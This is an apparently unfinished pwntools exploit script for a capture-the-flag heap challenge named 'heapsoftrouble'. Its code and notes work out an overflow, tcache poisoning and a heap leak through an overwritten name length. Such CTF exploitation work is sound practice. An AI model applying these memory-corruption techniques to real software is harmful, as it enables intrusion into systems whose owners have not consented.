#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('heapsoftrouble')

host = args.HOST or 'chal.ctf.b01lers.com'
port = int(args.PORT or 1010)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x5555555556b8
break *0x555555555361
break *0x5555555553e7
break *0x555555555537
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

context.aslr = False
#  context.log_level = "DEBUG"
io = start()

"""
- Need leaks because all the protections are on
- Delete a matrix, use silentOverflow to break via unlinking?

## Leak
- Delete matrix 0
- Create a new one (takes up original matrix slot, but not name bc 64 byte name on new)
- Do silent overflow (takes name spot and then writes into matrix 1)
  ```
    Matrix [Matrix #0]
    Population: 487652240
    Power Output: 48277571760
    Matrix [AAAAAAAABBBBBBBB\x00
    Population: 255
    Power Output: 25245
    Matrix []
    Population: 4702111234474983745
    Power Output: 4702111234474983745
  ```
- If we write into the name size & ptr, we can get arbitrary reads because:
    fwrite(matrix->name,1,(long)matrix->namelen,stdout)

## SIGSEGV Delete matrix 0
  - Silent overflow with 80 chars
  - Trigger a malloc (silent overflow works)
  ```
  *R8   0x4141414141414141 ('AAAAAAAA')
  0x1555553d01c8 <malloc+280>    mov    rsi, qword ptr [r8]
  ```

## Bins
Delete matrix (clears three 32-bytes chunks)
0x30 [  3]: 0x55555555a2b0 —▸ 0x55555555a2e0 —▸ 0x55555555a8b0 ◂— 0x0
Create silent buffer which allocates 0x55555555a2b0, use the overflow to write
into first-8 bytes, fwd ptr at 0x55555555a2e0

TCACHE SHOULD BE: 0x55555555a2e0 —▸ 0x414141414141
Next malloc returns 0x55555555a2e0
Next returns 0x414141414

2
Matrix #0
7
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
7
BBBB
7
WRITE TO ADDR HERE
"""

print("start?")
raw_input()

def login():
    io.send("Neo")
    io.sendline("z") # needs a char for some reason to print menu

def delete_matrix(name):
    io.sendline("2")
    io.sendline(name)

def create_matrix(name, population=1):
    io.sendline("1")
    io.sendline(name)
    io.sendline(str(population))

def silent_overflow(payload):
    io.sendline("7")
    io.sendline(payload)

def tcache_setup():
    # This series does a tcache house of spirit exploit
    delete_matrix("Matrix #0")
    silent_overflow(b"A"*48+b"BBBBBBBB")
    silent_overflow(b"X") # pop from tcache
    # Next malloc returns our controlled address to write to, e.g.
    #  silent_overflow(b"BBBBBBBB")

def write_name(addr, count):
    delete_matrix("Matrix #0")
    delete_matrix("Matrix #1") # create 128 bytes of free space

    create_matrix("ABCD", 1) # Name is where matrix 1 is.
    silent_overflow("B")       # pop off tcachebins
    silent_overflow("B")       # pop off tcachbins
    silent_overflow("B")       # overflow into name

def leak_heap():
    """
    Leaks heap by ovewriting "size" of pointer to Matrix #1's name to a large value.
    This can be extended to an arbitrary read by overwriting the name ptr to
    whatever.

    Could potentially use same trick for double free (overwrite name to self)
    """
    delete_matrix("Matrix #0") # make 64-bytes available
    silent_overflow("B")       # pop off tcachebins
    p = fit({40: [0x31, 0x1, 0x2]}) # chunk size, mat.population, mat.power_output
    p += b"\xff\xff\xff" # size overwrite, not full 8 bytes because the newline will overwrite into the name ptr
    silent_overflow(p)
    io.sendline("4")
    io.clean()
    io.sendline("Matrix #1")
    print(hexdump(io.recv()))

login()

# call things here

io.interactive()

